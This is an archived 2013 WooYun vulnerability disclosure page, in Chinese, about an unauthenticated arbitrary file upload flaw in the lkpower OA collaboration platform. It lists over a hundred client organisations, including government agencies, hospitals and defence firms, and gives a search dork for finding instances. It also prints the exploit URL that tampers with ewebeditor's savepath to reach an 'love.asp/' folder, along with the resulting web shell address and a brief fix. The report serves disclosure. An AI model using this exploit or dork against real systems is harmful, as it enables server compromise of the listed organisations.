<!doctype html>
                        <html lang="en">
                        <head>
	                        <meta charset="UTF-8">
	                        <title>		北京联达动力OA协同办公管理平台任意文件上传漏洞  </title>
	                        <link href="../css/css.css" rel="stylesheet" /> 
                        </head>
                        <body> 
                        <ul><li>标题：		北京联达动力OA协同办公管理平台任意文件上传漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/猪猪侠">猪猪侠</a> 
</li><li>提交时间：		2013-08-26 21:07</li></ul>
                        <div class="con">
                        <h2>漏洞详情</h2>
		<h3 class="detailTitle">披露状态：</h3>
		<p class="detail" style="padding-bottom:0">
					</p>
		<p class="detail">
									2013-08-26：	细节已通知厂商并且等待厂商处理中<br/>
									2013-08-30：	厂商已经确认，细节仅向厂商公开<br/>
									2013-09-02：	细节向第三方安全合作伙伴开放<br/>
									2013-09-09：	细节向核心白帽子及相关领域专家公开<br/>
									2013-09-19：	细节向普通白帽子公开<br/>
									2013-10-09：	细节向实习白帽子公开<br/>
									2013-11-24：	细节向公众公开<br/>
					</p>
		<h3 class="detailTitle">简要描述：</h3>

		<p class="detail">通过测试，发现北京联达动力信息科技发展有限公司旗下的OA协同办公管理平台，存在任意文件上传漏洞，用户无需登录，即可上传文件至服务器，并且当做脚本文件执行。</p>

				
						<h3 class="detailTitle">详细说明：</h3>
		
			<p class="detail">#0 本OA协同管理系统的客户源<br />
<br />
http://www.lkpower.com/templates/T_Second/index_150.html<br />
<br />
<br />
<br />
</p><pre><code>国务院港澳办<br />
国家体育总局<br />
国土资源部土地整理中心<br />
中国财政部投资评审中心<br />
中国农业科学院<br />
北京市教委<br />
北京市教工委<br />
山西省科学技术厅<br />
陕西省核工业地质局<br />
江苏省无线电管理局<br />
昆明市环境保护局<br />
昆明市水利局<br />
上海市宝山区公路管理署<br />
山东枣庄市工商行政管理局<br />
宁波江东区人民政府<br />
昆明市滇池管理局<br />
陕西人民广播电台<br />
沈阳广播电视台<br />
路桥集团国际建设股份有限公司<br />
中交第三公路工程局有限公司<br />
中交第四公路工程局有限公司<br />
中国建筑发展有限公司<br />
济南四建（集团）有限责任公司<br />
河南省宏力集团有限公司<br />
中国水电八局溪洛渡施工局<br />
北京天润子真建筑装饰有限责任公司<br />
北京康成人工环境工程有限公司<br />
首都医科大学附属北京安定医院<br />
北京中关村医院<br />
上海杨浦区疾病预防控制中心<br />
江西省人民医院<br />
安徽省合肥市第二人民医院<br />
无锡市妇幼保健医院<br />
徐州市肿瘤医院<br />
吴江市中医院<br />
泰州市人民医院<br />
北京体育大学<br />
北京化工大学<br />
北京大学网络教育学院<br />
中国地质大学长城学院<br />
天津工业大学<br />
天津商业大学<br />
天津职业技术师范学院<br />
中共河南省委党校<br />
重庆城市管理职业学院<br />
北京鼎事兴教育咨询有限公司<br />
济南铁路局<br />
哈尔滨铁路局<br />
南宁铁路局（车辆段）<br />
朔黄铁路肃宁分公司<br />
长沙机场高速路建设经营有限公司<br />
天津市政公路设备工程有限公司<br />
铁宇国际运输（天津）有限公司<br />
中国船舶重工集团公司<br />
中国兵器工业集团公司<br />
西北工业集团<br />
北方特种能源集团有限公司<br />
山西平阳重工机械有限责任公司<br />
西安东方机电（集团）有限公司<br />
中国石油集团测井有限公司<br />
中国寰球工程公司<br />
中煤第五建设公司<br />
中国水利电力物资有限公司<br />
淮南矿业（集团）有限责任公司<br />
甘肃省火电工程公司<br />
国电宁夏石嘴山发电有限责任公司<br />
湖北华清电力有限公司<br />
吉林龙华热电股份有限公司<br />
湖北郧县电力公司<br />
中机新能源开发有限公司<br />
浙江省台州供水有限公司<br />
中谷粮油集团公司<br />
中盐集团<br />
中远关西涂料化工有限公司<br />
北京三元集团有限责任公司<br />
深圳市泛谷药业有限公司<br />
昆明邦宇制药有限公司<br />
天津三华实业有限公司（韩资）<br />
天津天铁冶金集团有限公司（天津铁厂）<br />
湖南金荣企业集团<br />
厦门ABB低压电器设备有限公司<br />
无锡神羊实业（集团）有限公司<br />
深圳蓝韵集团有限公司<br />
北京怡海花园房地产开发有限公司<br />
北京中天海康投资有限公司<br />
北京东亚新华投资有限公司<br />
北京顺苑房地产开发有限公司<br />
北京昊远隆基房地产开发有限责任公司<br />
北京佳莲伟业房地产开发有限公司<br />
北京远中房地产开发有限公司<br />
德翰置业集团有限公司<br />
天津市房地产开发经营集团<br />
上海松源房地产开发有限公司<br />
北京英图光彩置业有限责任公司<br />
中国平安保险（集团）股份有限公司<br />
中国信达资产管理股份有限公司<br />
泰康人寿保险股份有限公司<br />
北京保险行业协会<br />
中国民族证券有限责任公司<br />
华宸信托有限责任公司<br />
北京远景环球投资顾问有限责任公司<br />
北京国富投资管理公司<br />
新时代证券有限责任公司<br />
天伦国际酒店管理集团<br />
北京天伦王朝酒店<br />
北京伯豪瑞廷酒店<br />
北京欣燕都酒店连锁有限公司<br />
北京蕉叶饮食有限公司<br />
北京南国苑餐饮管理有限公司<br />
北京黎昌海鲜大酒楼<br />
沈阳黎明国际酒店<br />
广州亚洲国际酒店<br />
中国普天信息产业集团公司<br />
中国铁通集团有限公司<br />
中国网通（集团）有限公司<br />
北京市通信公司<br />
大唐高鸿数据网络技术股份有限公司<br />
闪联信息技术工程中心有限公司<br />
四川电信实业集团有限责任公司<br />
北京交大网通信息技术有限公司<br />
北京富迪通科技发展公司<br />
中粮集团有限公司</code></pre><p class='detail'><br />
<br />
<br />
<br />
<br />
<br />
#1 问题描述<br />
<br />
OA协同办公管理平台调用了某开源编辑器，ewebeditor，savepath 可篡改导致可上传任意文件至 /love.asp/ 类似文件夹中，并讲上传的文件当做脚本文件执行。<br />
<br />
<br />
<br />
通过谷歌搜索：<br />
<br />
北京联达动力信息科技发展有限公司 intitle:登录<br />
<br />
<br />
<br />
http://222.132.***.***:8080/lkoa6/Editor/ewebeditor.htm?id=txtNR&amp;style=coolblue&amp;&amp;savepathfilename=myText3&amp;savepath=../LKUPLOADFILE/dzyjuploadfiles/love.asp/<br />
<br />
<br />
<br />
</p><p class="detail"><a href="../images/26202417143e8bdf67e5ad92909f82fc30b01f11.jpg" target="_blank"><img src="../images/26202417143e8bdf67e5ad92909f82fc30b01f11.jpg" alt="lkpower_upload.jpg" width="600"/></a></p><p class="detail"><br />
<br />
<br />
<br />
#2 成功上传后信息<br />
<br />
<br />
<br />
</p><pre><code>&lt;IMG border=0 src=&quot;/lkoa6/LKUPLOADFILE/dzyjuploadfiles/love.asp/20130826202310486.jpg&quot;&gt;</code></pre><p class='detail'> </p>
				
									<h3 class="detailTitle">漏洞证明：</h3>

			<p class="detail">#3 SHELL 地址<br />
<br />
http://222.132.***.***:8080/lkoa6/LKUPLOADFILE/dzyjuploadfiles/love.asp/20130826202310486.jpg<br />
<br />
<br />
<br />
</p><p class="detail"><a href="../images/262027404cb8b917fb5ced7f9bf4d53a2680e719.jpg" target="_blank"><img src="../images/262027404cb8b917fb5ced7f9bf4d53a2680e719.jpg" alt="lkpower_uploaded.jpg" width="600"/></a></p><p class="detail"><br />
<br />
 </p>

									<h3 class="detailTitle">修复方案：</h3>
			<p class="detail"># 校验savepath，或强制客户使用iis7以上中间件。 </p>
										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/猪猪侠" title="猪猪侠">猪猪侠</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-035334" title="北京联达动力OA协同办公管理平台任意文件上传漏洞">乌云</a></h3>
		<hr align="center"/>

				
			<h2>漏洞回应</h2>
			
			
															<h3 class="detailTitle">厂商回应：</h3>
						<p class="detail">危害等级：高</p>
						<p class="detail">漏洞Rank：20 </p>
													<p class="detail">确认时间：2013-08-30 22:58</p>
												<h3 class="detailTitle">厂商回复：</h3>				
						<p class="detail">CNVD确认并复现所述情况，通过互联网找到的用户实例较少，不过仍然可以确认为通用软件漏洞。从其官方网站用户列表找到的实例基本都处于内部网站，如果白帽子后续测试到其他实例，也欢迎继续以事件型漏洞提交。<br />
<br />
rank 20</p>
					

					
					
					<h3 class="detailTitle">最新状态：</h3>

											<p class="detail">暂无</p>
					

							
					
		
<hr align="center" />
<script type="text/javascript">
var bugid="35334";
var bugRating="-3";
var myRating="";
var ratingCount="0";



function ShowBugRating(k){
	var ratingItems=$(".myrating span");
	$.each(ratingItems,function(i,n){
		var nk=parseInt($(n).attr("rel"));
		if(nk<=k){
			$(n).addClass("on");
		}else{
			$(n).removeClass("on");
		}
	});
	$(".myrating span").hover(
		function(){
			$("#ratingShow").html($(this).attr("data-title"));
		},
		function(){
			$("#ratingShow").html("");
		}
	);
}
$(document).ready(function(){
	if(myRating==""){
		var ratingItems=$(".myrating span");
		$(".myrating span").hover(
			function(){
				$(this).addClass("hover");
				var k=parseInt($(this).attr("rel"));
				$.each(ratingItems,function(i,n){
					var nk=parseInt($(n).attr("rel"));
					if(nk<k) $(n).addClass("on");
					if(nk>k) $(n).removeClass("on");
				});
				$("#ratingShow").html($(this).attr("data-title"));
			},
			function(){
				$(this).removeClass("hover");
				if($("#myRating").val()==""){
					$.each(ratingItems,function(i,n){
						$(n).removeClass("on");
					});
				}
				$("#ratingShow").html("");
			}
		);

		$(".myrating span").click(function(){
			var rating=$(this).attr("rel");
			var k=parseInt($(this).attr("rel"));
			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
				//消除操作绑定
				$(".myrating span").unbind();
				re=parseInt(re);
				switch(re){
					case 1:
						$("#ratingShow").html("评分成功");
						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
						$.each(ratingItems,function(i,n){
							var nk=parseInt($(n).attr("rel"));
							if(nk<=k){
								$(n).addClass("on");
							}else{
								$(n).removeClass("on");
							}
						});
						ShowBugRating(rating);
						break;
					case 2:
						$("#ratingShow").html("请先登录");
						break;
					case 4:
						$("#ratingShow").html("已对此漏洞进行过评分");
						break;
					case 6:
						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
						break;
					default:break;
				}
			});
		});
	}else{
		if(ratingCount>2){
			ShowBugRating(bugRating);
		}else{
			ShowBugRating(-3);
		}
	}
});

</script>
<h3 class="detailTitle">漏洞评价：</h3>
                        </div>
                        </body>
                        </html>
